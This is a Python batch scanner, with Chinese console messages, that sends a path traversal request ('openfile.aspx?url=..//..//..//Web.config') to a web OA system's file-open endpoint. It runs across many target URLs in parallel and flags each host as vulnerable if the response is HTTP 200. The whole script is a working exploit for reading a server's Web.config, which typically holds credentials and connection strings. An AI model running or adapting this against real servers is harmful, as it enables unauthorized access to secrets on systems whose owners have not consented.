import requests
from multiprocessing import Pool
import warnings
import argparse
from lxml import etree
proxy="http://127.0.0.1:7890"

warnings.filterwarnings("ignore")
headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close'
}

def main():
    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", "--url",dest="target", help="url检测")
    argparser.add_argument("-f", "--file",dest="file",help="批量检测")
    arg=argparser.parse_args()
    pool = Pool(processes=30)
    target = arg.target
    file = arg.file
    targets = []
    if target:
        check(target)
    elif file:
        try:
            with open(file, "r", encoding="utf-8") as f:
                target = f.readlines()
                for target in target:
                    if "http" in target:
                        target = target.strip()
                        targets.append(target)
                    else:
                        target = "http://" + target
                        targets.append(target)
        except Exception as e:
            print("[文件错误！]")
        pool.map(check, targets)
def check(target):
    try:
        url=f"{target}/oa/isprit/module/openfile.aspx?url="+"..//..//..//Web.config"
        response = requests.get(url,headers=headers, timeout=3)
        if response.status_code == 200:
           print(f"[*]{url}存在漏洞")
        else:
            print(f"[!]{url}不存在漏洞")
    except Exception as e:
        print(f"[ERROR]请求超时{url}")
    #print(url)
if __name__ == '__main__':
    main()